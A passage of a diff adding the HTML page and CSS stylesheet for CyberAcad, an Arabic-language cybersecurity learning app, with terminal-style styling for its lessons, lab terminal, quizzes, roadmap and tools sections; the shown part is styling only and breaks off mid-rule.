@@ -1,0 +1,2305 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#020408">
+<meta name="description" content="أكاديمية الأمن السيبراني — تعلم من الصفر إلى الاحتراف">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="CyberAcad">
+<link rel="manifest" href="manifest.json">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&family=Tajawal:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+<title>CyberAcad | أكاديمية الأمن السيبراني</title>
+<style>
+/* ============================================================
+   ROOT VARIABLES — HACKER TERMINAL AESTHETIC
+   ============================================================ */
+:root {
+  --void:       #010306;
+  --deep:       #020408;
+  --surface:    #060d12;
+  --panel:      #0a1520;
+  --panel2:     #0d1c28;
+  --border:     rgba(0,255,65,0.12);
+  --border-hot: rgba(0,255,65,0.35);
+  --border-red: rgba(255,0,64,0.3);
+  --green:      #00ff41;
+  --green-dim:  #00aa2b;
+  --green-ghost:rgba(0,255,65,0.06);
+  --red:        #ff0040;
+  --red-dim:    #cc0033;
+  --orange:     #ff6b00;
+  --yellow:     #ffcc00;
+  --cyan:       #00e5ff;
+  --text:       #c8f0d4;
+  --text-dim:   #4a7a55;
+  --text-ghost: #1e3a25;
+  --glow-g:     0 0 20px rgba(0,255,65,0.45);
+  --glow-r:     0 0 20px rgba(255,0,64,0.45);
+  --glow-c:     0 0 20px rgba(0,229,255,0.35);
+  --font-mono:  'Share Tech Mono', monospace;
+  --font-head:  'Rajdhani', sans-serif;
+  --font-body:  'Tajawal', sans-serif;
+}
+
+/* ============================================================  RESET */
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--void);
+  color: var(--text);
+  font-family: var(--font-body);
+  min-height: 100vh;
+  overflow-x: hidden;
+  cursor: default;
+}
+
+/* ============================================================  SCANLINES */
+body::before {
+  content: '';
+  position: fixed; inset: 0; z-index: 0; pointer-events: none;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,255,65,0.015) 2px,
+    rgba(0,255,65,0.015) 4px
+  );
+  animation: scanMove 8s linear infinite;
+}
+@keyframes scanMove {
+  from { background-position: 0 0; }
+  to   { background-position: 0 100px; }
+}
+
+/* Grid overlay */
+body::after {
+  content: '';
+  position: fixed; inset: 0; z-index: 0; pointer-events: none;
+  background-image:
+    linear-gradient(rgba(0,255,65,0.025) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,255,65,0.025) 1px, transparent 1px);
+  background-size: 50px 50px;
+}
+
+/* ============================================================  SCROLLBAR */
+::-webkit-scrollbar { width: 4px; }
+::-webkit-scrollbar-track { background: var(--void); }
+::-webkit-scrollbar-thumb { background: var(--green-dim); border-radius: 2px; }
+
+/* ============================================================  BINARY RAIN CANVAS */
+#matrix-canvas {
+  position: fixed; inset: 0; z-index: 0;
+  opacity: 0.04; pointer-events: none;
+}
+
+/* ============================================================  SPLASH */
+#splash {
+  position: fixed; inset: 0; z-index: 2000;
+  background: var(--void);
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  gap: 20px;
+  transition: opacity .8s ease, visibility .8s;
+}
+#splash.out { opacity: 0; visibility: hidden; }
+
+.splash-terminal {
+  width: min(480px, 90vw);
+  background: var(--surface);
+  border: 1px solid var(--border-hot);
+  border-radius: 8px;
+  overflow: hidden;
+  box-shadow: var(--glow-g), inset 0 0 40px rgba(0,255,65,0.03);
+}
+.splash-titlebar {
+  background: rgba(0,255,65,0.08);
+  border-bottom: 1px solid var(--border);
+  padding: 8px 14px;
+  display: flex; align-items: center; gap: 8px;
+  font-family: var(--font-mono); font-size: .75rem; color: var(--text-dim);
+}
+.tb-dot { width:10px;height:10px;border-radius:50%; }
+.tb-dot.r{background:#ff5f57;} .tb-dot.y{background:#febc2e;} .tb-dot.g{background:#28c840;}
+.splash-body { padding: 20px 24px; font-family: var(--font-mono); font-size: .85rem; line-height: 2; }
+.splash-body .prompt { color: var(--green); }
+.splash-body .cmd { color: #fff; }
+.splash-body .out { color: var(--text-dim); }
+.splash-body .hi { color: var(--green); font-weight: bold; }
+.cursor-blink {
+  display: inline-block; width: 8px; height: 14px;
+  background: var(--green); vertical-align: middle;
+  animation: blink .8s step-start infinite;
+}
+@keyframes blink { 50% { opacity: 0; } }
+
+.splash-bar-wrap {
+  height: 3px; background: var(--surface); margin-top: 4px; overflow: hidden;
+}
+.splash-bar {
+  height: 100%; width: 0;
+  background: linear-gradient(90deg, var(--green-dim), var(--green));
+  animation: loadBar 2.4s ease forwards;
+}
+@keyframes loadBar { to { width: 100%; } }
+
+/* ============================================================  APP */
+#app { position: relative; z-index: 1; display: none; }
+#app.on { display: block; }
+
+/* ============================================================  HEADER */
+.hdr {
+  position: sticky; top: 0; z-index: 100;
+  background: rgba(2,4,8,0.94);
+  backdrop-filter: blur(16px);
+  border-bottom: 1px solid var(--border);
+  padding: 0 24px;
+  height: 56px;
+  display: flex; align-items: center; justify-content: space-between;
+}
+.hdr::after {
+  content: '';
+  position: absolute; bottom: 0; left: 0; right: 0;
+  height: 1px;
+  background: linear-gradient(90deg, transparent, var(--green), transparent);
+  opacity: .4;
+}
+
+.hdr-logo {
+  display: flex; align-items: center; gap: 10px;
+  text-decoration: none;
+}
+.hdr-icon {
+  width: 34px; height: 34px;
+  border: 1px solid var(--green-dim);
+  border-radius: 6px;
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--font-mono); font-size: .8rem;
+  color: var(--green);
+  position: relative;
+  overflow: hidden;
+}
+.hdr-icon::before {
+  content: '>';
+  position: absolute;
+  animation: iconSpin 4s linear infinite;
+}
+@keyframes iconSpin {
+  0%   { content: '>'; opacity: 1; }
+  25%  { content: '$'; opacity: .8; }
+  50%  { content: '#'; opacity: 1; }
+  75%  { content: '~'; opacity: .8; }
+}
+.hdr-name { font-family: var(--font-head); font-size: 1.1rem; font-weight: 700; color: var(--green); letter-spacing: 2px; }
+.hdr-sub  { font-size: .6rem; color: var(--text-dim); letter-spacing: 3px; font-family: var(--font-mono); text-transform: uppercase; }
+
+.hdr-chips { display: flex; gap: 12px; align-items: center; }
+.hdr-chip {
+  background: var(--green-ghost);
+  border: 1px solid var(--border);
+  padding: 5px 12px; border-radius: 4px;
+  font-family: var(--font-mono); font-size: .75rem; color: var(--text-dim);
+  display: flex; align-items: center; gap: 6px;
+}
+.hdr-chip b { color: var(--green); }
+@media(max-width:600px){ .hdr-chips { display: none; } }
+
+/* ============================================================  NAV */
+.nav {
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  padding: 0 24px;
+  display: flex; gap: 2px;
+  overflow-x: auto;
+  scrollbar-width: none;
+}
+.nav::-webkit-scrollbar { display: none; }
+.nav-btn {
+  background: none; border: none; cursor: pointer;
+  color: var(--text-dim);
+  font-family: var(--font-mono); font-size: .78rem;
+  padding: 12px 16px;
+  white-space: nowrap;
+  border-bottom: 2px solid transparent;
+  transition: all .25s;
+  position: relative;
+  display: flex; align-items: center; gap: 6px;
+}
+.nav-btn:hover { color: var(--green); }
+.nav-btn.active {
+  color: var(--green);
+  border-bottom-color: var(--green);
+  background: rgba(0,255,65,0.04);
+}
+.nav-btn .nb-tag {
+  background: rgba(255,0,64,0.15);
+  border: 1px solid rgba(255,0,64,0.3);
+  color: var(--red);
+  border-radius: 3px;
+  padding: 1px 5px;
+  font-size: .6rem;
+}
+
+/* ============================================================  PAGES */
+.pg { display: none; padding: 28px 24px; max-width: 1240px; margin: 0 auto; }
+.pg.on { display: block; animation: pgIn .35s ease; }
+@keyframes pgIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+/* ============================================================  SECTION HEADERS */
+.sec-hd {
+  margin-bottom: 6px;
+  display: flex; align-items: center; gap: 12px;
+}
+.sec-hd-line {
+  flex: 1; height: 1px;
+  background: linear-gradient(90deg, var(--border-hot), transparent);
+}
+.sec-title {
+  font-family: var(--font-head); font-size: 1.4rem; font-weight: 700;
+  color: var(--text); letter-spacing: 1px;
+}
+.sec-title .hl { color: var(--green); }
+.sec-title .rl { color: var(--red); }
+.sec-sub { color: var(--text-dim); font-size: .85rem; margin-bottom: 24px; font-family: var(--font-mono); }
+
+/* ============================================================  HERO */
+.hero {
+  min-height: 60vh;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  text-align: center;
+  position: relative; padding: 60px 20px;
+}
+.hero-ring {
+  position: absolute;
+  border-radius: 50%; pointer-events: none;
+  border: 1px solid rgba(0,255,65,0.08);
+  animation: ringPulse 6s ease-in-out infinite;
+}
+.hero-ring:nth-child(1){ width:300px;height:300px; animation-delay:0s; }
+.hero-ring:nth-child(2){ width:500px;height:500px; animation-delay:1.5s; border-color:rgba(0,255,65,0.05); }
+.hero-ring:nth-child(3){ width:700px;height:700px; animation-delay:3s; border-color:rgba(0,255,65,0.03); }
+@keyframes ringPulse {
+  0%,100% { transform: scale(1); opacity: .6; }
+  50%      { transform: scale(1.04); opacity: 1; }
+}
+
+.hero-tag {
+  display: inline-flex; align-items: center; gap: 8px;
+  border: 1px solid var(--border-hot);
+  background: var(--green-ghost);
+  padding: 5px 16px; border-radius: 3px;
+  font-family: var(--font-mono); font-size: .75rem; color: var(--green);
+  margin-bottom: 24px; letter-spacing: 2px;
+  position: relative; z-index: 1;
+}
+.hero-tag::before { content: '//'; color: var(--green-dim); }
+
+.hero h1 {
+  font-family: var(--font-head);
+  font-size: clamp(2.2rem, 6vw, 4rem);
+  font-weight: 700; line-height: 1.1;
+  letter-spacing: 2px;
+  margin-bottom: 16px;
+  position: relative; z-index: 1;
+}
+.hero h1 .g { color: var(--green); text-shadow: var(--glow-g); }
+.hero h1 .r { color: var(--red); text-shadow: var(--glow-r); }
+
+.hero p {
+  color: var(--text-dim); font-size: 1rem; max-width: 560px;
+  line-height: 1.8; margin: 0 auto 36px;
+  position: relative; z-index: 1;
+  font-family: var(--font-mono);
+}
+
+.hero-btns { display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; position: relative; z-index: 1; }
+
+.btn-hack {
+  background: transparent;
+  border: 1px solid var(--green);
+  color: var(--green);
+  font-family: var(--font-mono); font-size: .9rem;
+  padding: 13px 30px; border-radius: 3px;
+  cursor: pointer; letter-spacing: 1px;
+  transition: all .3s; position: relative; overflow: hidden;
+}
+.btn-hack::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: var(--green);
+  transform: scaleX(0); transform-origin: right;
+  transition: transform .3s; z-index: -1;
+}
+.btn-hack:hover { color: var(--void); box-shadow: var(--glow-g); }
+.btn-hack:hover::before { transform: scaleX(1); transform-origin: left; }
+
+.btn-ghost {
+  background: transparent;
+  border: 1px solid var(--border-red);
+  color: var(--red);
+  font-family: var(--font-mono); font-size: .9rem;
+  padding: 13px 30px; border-radius: 3px;
+  cursor: pointer; letter-spacing: 1px;
+  transition: all .3s;
+}
+.btn-ghost:hover { background: rgba(255,0,64,0.08); box-shadow: var(--glow-r); }
+
+/* ============================================================  STAT ROW */
+.stats-row {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+  gap: 14px; margin: 36px 0;
+}
+.stat-box {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px; padding: 18px 16px;
+  text-align: center; transition: all .3s;
+  position: relative; overflow: hidden;
+}
+.stat-box::after {
+  content: '';
+  position: absolute; bottom: 0; left: 0; right: 0;
+  height: 2px;
+  background: var(--green);
+  transform: scaleX(0); transition: transform .3s;
+}
+.stat-box:hover::after { transform: scaleX(1); }
+.stat-box:hover { border-color: var(--border-hot); }
+.stat-n {
+  font-family: var(--font-mono); font-size: 2rem; font-weight: bold;
+  color: var(--green); text-shadow: var(--glow-g);
+}
+.stat-l { color: var(--text-dim); font-size: .78rem; margin-top: 4px; font-family: var(--font-mono); }
+
+/* ============================================================  LEVEL CARDS */
+.lvl-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(270px, 1fr));
+  gap: 18px; margin-bottom: 24px;
+}
+.lvl-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px; padding: 22px;
+  cursor: pointer; transition: all .3s;
+  position: relative; overflow: hidden;
+}
+.lvl-card::before {
+  content: '';
+  position: absolute; top: 0; left: 0; right: 0;
+  height: 2px;
+}
+.lvl-card.l1::before { background: var(--green-dim); }
+.lvl-card.l2::before { background: var(--cyan); }
+.lvl-card.l3::before { background: var(--orange); }
+.lvl-card.l4::before { background: var(--red); }
+
+.lvl-card::after {
+  content: attr(data-num);
+  position: absolute; bottom: -10px; left: -10px;
+  font-family: var(--font-mono); font-size: 4rem;
+  font-weight: bold; opacity: .04; color: var(--green);
+  line-height: 1;
+}
+
+.lvl-card:hover { transform: translateY(-3px); }
+.lvl-card.l1:hover { border-color: rgba(0,255,65,0.4);  box-shadow: 0 8px 30px rgba(0,255,65,0.1); }
+.lvl-card.l2:hover { border-color: rgba(0,229,255,0.4); box-shadow: 0 8px 30px rgba(0,229,255,0.1); }
+.lvl-card.l3:hover { border-color: rgba(255,107,0,0.4); box-shadow: 0 8px 30px rgba(255,107,0,0.1); }
+.lvl-card.l4:hover { border-color: rgba(255,0,64,0.4);  box-shadow: 0 8px 30px rgba(255,0,64,0.1); }
+
+.lvl-badge {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 3px 10px; border-radius: 3px;
+  font-family: var(--font-mono); font-size: .7rem;
+  letter-spacing: 1px; margin-bottom: 14px;
+}
+.l1 .lvl-badge { background:rgba(0,255,65,0.08);  color:var(--green);  border:1px solid rgba(0,255,65,0.2); }
+.l2 .lvl-badge { background:rgba(0,229,255,0.08); color:var(--cyan);   border:1px solid rgba(0,229,255,0.2); }
+.l3 .lvl-badge { background:rgba(255,107,0,0.08); color:var(--orange); border:1px solid rgba(255,107,0,0.2); }
+.l4 .lvl-badge { background:rgba(255,0,64,0.08);  color:var(--red);    border:1px solid rgba(255,0,64,0.2); }
+
+.lvl-title { font-family: var(--font-head); font-size: 1.15rem; font-weight: 700; margin-bottom: 8px; letter-spacing: 1px; }
+.lvl-desc  { color: var(--text-dim); font-size: .82rem; line-height: 1.7; margin-bottom: 16px; font-family: var(--font-mono); }
+.lvl-meta  { display: flex; gap: 14px; }
+.lvl-meta-item { font-family: var(--font-mono); font-size: .75rem; color: var(--text-ghost); display: flex; align-items: center; gap: 4px; }
+
+.lvl-prog-wrap { height: 2px; background: rgba(255,255,255,0.05); border-radius: 1px; margin-top: 16px; }
+.lvl-prog-bar  { height: 100%; border-radius: 1px; transition: width 1.2s cubic-bezier(.23,1,.32,1); }
+.l1 .lvl-prog-bar { background: var(--green); }
+.l2 .lvl-prog-bar { background: var(--cyan); }
+.l3 .lvl-prog-bar { background: var(--orange); }
+.l4 .lvl-prog-bar { background: var(--red); }
+
+/* ============================================================  LESSON VIEW */
+.lesson-wrap { display: none; }
+.lesson-wrap.on { display: block; }
+
+.breadcrumb {
+  display: flex; align-items: center; gap: 8px;
+  font-family: var(--font-mono); font-size: .78rem; color: var(--text-dim);
+  margin-bottom: 20px;
+}
+.breadcrumb a { color: var(--green); cursor: pointer; text-decoration: none; }
+.breadcrumb a:hover { text-shadow: var(--glow-g); }
+
+.lesson-hdr {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px; padding: 26px 28px;
+  margin-bottom: 20px;
+  position: relative; overflow: hidden;
+}
+.lesson-hdr::before {
+  content: '';
+  position: absolute; top: 0; right: 0; bottom: 0;
+  width: 3px;
+  background: linear-gradient(to bottom, var(--green), var(--cyan));
+}
+.lesson-num-tag {
+  font-family: var(--font-mono); font-size: .72rem;
+  color: var(--green-dim); margin-bottom: 10px; letter-spacing: 3px;
+}
+.lesson-main-title { font-family: var(--font-head); font-size: 1.7rem; font-weight: 700; letter-spacing: 1px; margin-bottom: 8px; }
+.lesson-main-desc  { color: var(--text-dim); font-family: var(--font-mono); font-size: .85rem; line-height: 1.6; }
+
+.lesson-layout {
+  display: grid;
+  grid-template-columns: 1fr 300px;
+  gap: 20px;
+}
+@media(max-width:900px){ .lesson-layout { grid-template-columns: 1fr; } }
+
+/* Content */
+.lesson-body {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px; padding: 28px;
+}
+.lesson-body h3 {
+  font-family: var(--font-head); font-size: 1rem; font-weight: 700;
+  color: var(--green); margin: 26px 0 12px;
+  letter-spacing: 1px; display: flex; align-items: center; gap: 8px;
+}
+.lesson-body h3:first-child { margin-top: 0; }
+.lesson-body h3::before {
+  content: '//'; font-family: var(--font-mono); color: var(--green-dim); font-size: .8rem;
+}
+.lesson-body p {
+  color: var(--text-dim); line-height: 1.9; margin-bottom: 14px;
+  font-size: .92rem;
+}
+.lesson-body strong { color: var(--text); }
+
+.info-box {
+  background: rgba(0,255,65,0.04);
+  border: 1px solid rgba(0,255,65,0.2);
+  border-radius: 6px; padding: 14px 18px; margin: 16px 0;
+  position: relative;
+}
+.info-box::before { content: '[!]'; position:absolute; top:-10px; right:14px; background:var(--surface); padding:0 6px; font-family:var(--font-mono); font-size:.7rem; color:var(--green); }
+.info-box p { margin: 0; font-size: .87rem; color: var(--text-dim); }
+
+.warn-box {
+  background: rgba(255,0,64,0.04);
+  border: 1px solid rgba(255,0,64,0.2);
+  border-radius: 6px; padding: 14px 18px; margin: 16px 0;
+}
+.warn-box p { margin: 0; font-size: .87rem; color: rgba(255,150,150,0.8); }
+
+.term-block {
+  background: #010204;
+  border: 1px solid rgba(0,255,65,0.15);
+  border-radius: 6px; margin: 16px 0;
+  overflow: hidden;
+}
+.term-titlebar {
+  background: rgba(0,255,65,0.05);
+  border-bottom: 1px solid var(--border);
+  padding: 7px 14px;
+  display: flex; align-items: center; gap: 6px;
+  font-family: var(--font-mono); font-size: .7rem; color: var(--text-dim);
+}
+.term-titlebar .t-dot { width:8px;height:8px;border-radius:50%; }
+.term-titlebar .t-dot.r{background:#ff5f57;} .term-titlebar .t-dot.y{background:#febc2e;} .term-titlebar .t-dot.g{background:#28c840;}
+.term-code {
+  padding: 16px 18px;
+  font-family: var(--font-mono); font-size: .83rem; line-height: 2;
+  overflow-x: auto; color: var(--green);
+}
+.term-code .cmd    { color: var(--green); }
+.term-code .flag   { color: var(--cyan); }
+.term-code .out    { color: var(--text-dim); }
+.term-code .hi     { color: var(--yellow); }
+.term-code .comment{ color: var(--text-ghost); }
+.term-code .danger { color: var(--red); }
+
+.data-table {
+  width: 100%; border-collapse: collapse; margin: 16px 0;
+  font-family: var(--font-mono); font-size: .8rem;
+}
+.data-table th {
+  background: rgba(0,255,65,0.06);
+  color: var(--green); padding: 10px 14px;
+  text-align: right; border-bottom: 1px solid var(--border);
+  letter-spacing: 1px;
+}
+.data-table td {
+  padding: 10px 14px;
+  border-bottom: 1px solid rgba(255,255,255,0.04);
+  color: var(--text-dim);
+}
+.data-table tr:hover td { background: rgba(0,255,65,0.02); }
+
+/* Sidebar */
+.lesson-sidebar {}
+.side-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px; padding: 18px;
+  margin-bottom: 14px;
+}
+.side-card h4 {
+  font-family: var(--font-mono); font-size: .78rem;
+  color: var(--green); margin-bottom: 14px; letter-spacing: 2px;
+}
+.topic-list { list-style: none; }
+.topic-list li {
+  padding: 7px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.03);
+  font-family: var(--font-mono); font-size: .8rem;
+  color: var(--text-dim); cursor: pointer;
+  display: flex; align-items: center; gap: 8px;
+  transition: color .2s;
+}
+.topic-list li::before { content: '>'; color: var(--text-ghost); transition: color .2s; }
+.topic-list li:hover, .topic-list li.act { color: var(--green); }
+.topic-list li:hover::before, .topic-list li.act::before { color: var(--green); }
+
+.lesson-nav {
+  display: flex; gap: 10px; margin-top: 14px;
+}
+.btn-nav {
+  flex: 1;
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 4px; padding: 10px;
+  cursor: pointer; color: var(--text-dim);
+  font-family: var(--font-mono); font-size: .8rem;
+  transition: all .25s; display: flex; align-items: center; justify-content: center; gap: 6px;
+}
+.btn-nav:hover { border-color: var(--border-hot); color: var(--green); }
+.btn-nav.green { background: var(--green); border-color: var(--green); color: var(--void); font-weight: bold; }
+.btn-nav.green:hover { box-shadow: var(--glow-g); transform: translateY(-1px); }
+.btn-mark {
+  width: 100%; margin-top: 10px;
+  background: transparent; border: 1px solid var(--green-dim);
+  border-radius: 4px; padding: 11px;
+  cursor: pointer; color: var(--green-dim);
+  font-family: var(--font-mono); font-size: .82rem;
+  transition: all .25s; letter-spacing: 1px;
+}
+.btn-mark:hover { background: var(--green); border-color: var(--green); color: var(--void); box-shadow: var(--glow-g); }
+
+/* ============================================================  LABS */
+.lab-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+  gap: 18px;
+}
+.lab-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px; padding: 22px;
+  cursor: pointer; transition: all .3s;
+  position: relative;
+}
+.lab-card:hover { border-color: var(--border-hot); transform: translateY(-3px); box-shadow: var(--glow-g); }
+.lab-diff {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 3px 10px; border-radius: 3px;
+  font-family: var(--font-mono); font-size: .7rem; margin-bottom: 12px; letter-spacing: 1px;
+}
+.diff-easy   { background:rgba(0,255,65,0.08); color:var(--green); border:1px solid rgba(0,255,65,0.2); }
+.diff-medium { background:rgba(255,204,0,0.08); color:var(--yellow); border:1px solid rgba(255,204,0,0.2); }
+.diff-hard   { background:rgba(255,107,0,0.08); color:var(--orange); border:1px solid rgba(255,107,0,0.2); }
+.diff-expert { background:rgba(255,0,64,0.08);  color:var(--red);    border:1px solid rgba(255,0,64,0.2); }
+
+.lab-title { font-family: var(--font-head); font-size: 1rem; font-weight: 700; margin-bottom: 6px; letter-spacing: 1px; }
+.lab-desc  { color: var(--text-dim); font-family: var(--font-mono); font-size: .8rem; line-height: 1.6; margin-bottom: 14px; }
+.lab-tags  { display: flex; flex-wrap: wrap; gap: 6px; }
+.lab-tag {
+  background: rgba(0,255,65,0.04);
+  border: 1px solid var(--border);
+  border-radius: 3px; padding: 2px 8px;
+  font-family: var(--font-mono); font-size: .7rem; color: var(--text-dim);
+}
+
+/* Lab Terminal */
+.lab-terminal-wrap { display: none; }
+.lab-terminal-wrap.on { display: block; }
+.lab-term {
+  background: #010204;
+  border: 1px solid rgba(0,255,65,0.2);
+  border-radius: 8px; overflow: hidden;
+  margin-top: 20px;
+}
+.lab-term-bar {
+  background: rgba(0,255,65,0.06);
+  border-bottom: 1px solid var(--border);
+  padding: 10px 16px;
+  display: flex; align-items: center; gap: 10px;
+  font-family: var(--font-mono); font-size: .78rem; color: var(--green-dim);
+}
+.lab-term-screen {
+  padding: 20px;
+  font-family: var(--font-mono); font-size: .85rem;
+  color: var(--green); line-height: 1.9;
+  min-height: 250px;
+}
+.lab-input-row {
+  border-top: 1px solid var(--border);
+  padding: 12px 16px;
+  display: flex; align-items: center; gap: 10px;
+  background: rgba(0,255,65,0.02);
+}
+.lab-prompt { color: var(--green); font-family: var(--font-mono); font-size: .85rem; white-space: nowrap; }
+.lab-input {
+  flex: 1; background: transparent; border: none; outline: none;
+  font-family: var(--font-mono); font-size: .85rem; color: var(--green);
+  caret-color: var(--green);
+  direction: ltr;
+}
+.lab-run {
+  background: var(--green); border: none;
+  color: var(--void); font-family: var(--font-mono); font-size: .78rem;
+  padding: 6px 14px; border-radius: 3px; cursor: pointer;
+  font-weight: bold; letter-spacing: 1px;
+  transition: all .25s;
+}
+.lab-run:hover { box-shadow: var(--glow-g); }
+.hint-btn {
+  background: rgba(255,204,0,0.08); border: 1px solid rgba(255,204,0,0.25);
+  color: var(--yellow); font-family: var(--font-mono); font-size: .75rem;
+  padding: 5px 12px; border-radius: 3px; cursor: pointer;
+  transition: all .25s;
+}
+.hint-btn:hover { background: rgba(255,204,0,0.15); }
+
+/* ============================================================  QUIZ */
+.quiz-lvl-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+  gap: 16px; margin-bottom: 24px;
+}
+.qz-box {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 8px; padding: 22px; cursor: pointer; transition: all .3s;
+}
+.qz-box:hover { border-color: var(--border-hot); box-shadow: var(--glow-g); transform: translateY(-2px); }
+
+.quiz-arena { display: none; }
+.quiz-arena.on { display: block; }
+
+.quiz-hd {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 8px; padding: 26px; margin-bottom: 16px;
+}
+.q-prog-track { display: flex; gap: 4px; margin-bottom: 18px; }
+.q-prog-dot {
+  flex: 1; height: 3px; border-radius: 2px;
+  background: rgba(255,255,255,0.07);
+  transition: background .3s;
+}
+.q-prog-dot.done { background: var(--green); }
+.q-prog-dot.cur  { background: var(--cyan); }
+
+.q-meta { font-family: var(--font-mono); font-size: .72rem; color: var(--text-dim); margin-bottom: 10px; letter-spacing: 2px; }
+.q-text { font-family: var(--font-head); font-size: 1.15rem; font-weight: 600; line-height: 1.5; }
+
+.q-opts { display: flex; flex-direction: column; gap: 10px; margin: 22px 0; }
+.q-opt {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px; padding: 14px 18px;
+  cursor: pointer; font-family: var(--font-mono); font-size: .88rem;
+  color: var(--text-dim); text-align: right;
+  display: flex; align-items: center; gap: 12px;
+  transition: all .25s;
+}
+.q-opt:hover { border-color: var(--border-hot); color: var(--text); }
+.q-opt.correct { background:rgba(0,255,65,0.08);  border-color: var(--green); color: var(--green); }
+.q-opt.wrong   { background:rgba(255,0,64,0.08);  border-color: var(--red);   color: var(--red); }
+.q-opt-key {
+  width: 26px; height: 26px; border-radius: 4px;
+  background: rgba(255,255,255,0.06);
+  display: flex; align-items: center; justify-content: center;
+  font-size: .72rem; font-weight: bold; flex-shrink: 0;
+}
+
+.q-feedback {
+  background: rgba(0,255,65,0.04); border: 1px solid var(--border);
+  border-radius: 6px; padding: 16px; margin-bottom: 18px;
+  font-family: var(--font-mono); font-size: .83rem; color: var(--text-dim);
+  line-height: 1.7; display: none;
+}
+.q-feedback.on { display: block; }
+.q-feedback.ok { background:rgba(0,255,65,0.06); border-color:rgba(0,255,65,0.25); }
+.q-feedback.ng { background:rgba(255,0,64,0.06); border-color:rgba(255,0,64,0.25); }
+
+.quiz-result-wrap { display: none; }
+.quiz-result-wrap.on { display: block; }
+.result-panel {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 8px; padding: 40px; text-align: center;
+}
+.result-big { font-size: 4rem; margin-bottom: 14px; }
+.result-score { font-family: var(--font-head); font-size: 2.5rem; font-weight: 700; margin-bottom: 8px; }
+.result-score.green { color: var(--green); text-shadow: var(--glow-g); }
+.result-score.red   { color: var(--red);   text-shadow: var(--glow-r); }
+.result-msg { color: var(--text-dim); font-family: var(--font-mono); font-size: .85rem; margin-bottom: 28px; }
+
+/* ============================================================  ROADMAP */
+.roadmap { position: relative; }
+.rm-spine {
+  position: absolute; right: 20px; top: 0; bottom: 0;
+  width: 1px;
+  background: linear-gradient(to bottom, var(--green), var(--cyan), var(--orange), var(--red));
+  opacity: .2;
+}
+.rm-phase {
+  position: relative; margin-bottom: 28px; padding-right: 56px;
+}
+.rm-dot {
+  position: absolute; right: 12px; top: 22px;
+  width: 16px; height: 16px; border-radius: 50%;
+  background: var(--void); border: 1px solid var(--text-dim);
+  transform: translateX(50%);
+  transition: all .3s;
+}
+.rm-dot.active { background: var(--green); border-color: var(--green); box-shadow: var(--glow-g); animation: dotPulse 2s infinite; }
+.rm-dot.done   { background: var(--green-dim); border-color: var(--green-dim); }
+@keyframes dotPulse {
+  0%,100%{box-shadow:0 0 0 0 rgba(0,255,65,0.5)}
+  50%    {box-shadow:0 0 0 8px rgba(0,255,65,0)}
+}
+.rm-card {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 8px; padding: 18px;
+}
+.rm-card-hd { display: flex; align-items: center; gap: 10px; margin-bottom: 14px; }
+.rm-num {
+  background: var(--panel); border: 1px solid var(--border);
+  width: 30px; height: 30px; border-radius: 4px;
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--font-mono); font-size: .75rem; color: var(--green);
+}
+.rm-title { font-family: var(--font-head); font-size: .95rem; font-weight: 700; letter-spacing: 1px; }
+.rm-dur   { font-family: var(--font-mono); font-size: .72rem; color: var(--text-dim); margin-right: auto; }
+.rm-tags  { display: flex; flex-wrap: wrap; gap: 7px; }
+.rm-tag {
+  background: var(--green-ghost); border: 1px solid var(--border);
+  border-radius: 3px; padding: 3px 10px;
+  font-family: var(--font-mono); font-size: .72rem; color: var(--text-dim);
+}
+
+/* ============================================================  TOOLS */
+.tools-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(270px, 1fr));
+  gap: 16px;
+}
+.tool-card {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: 8px; padding: 20px; transition: all .3s;
+}
+.tool-card:hover { border-color: var(--border-hot); transform: translateY(-2px); }
+.tool-icon { font-size: 1.8rem; margin-bottom: 10px; }
+.tool-name { font-family: var(--font-head); font-size: 1rem; font-weight: 700; margin-bottom: 6px; letter-spacing: 1px; }
+.tool-desc { color: var(--text-dim); font-family: var(--font-mono); font-size: .78rem; line-height: 1.6; }
+.tool-cat {
+  display: inline-block; margin-top: 10px;
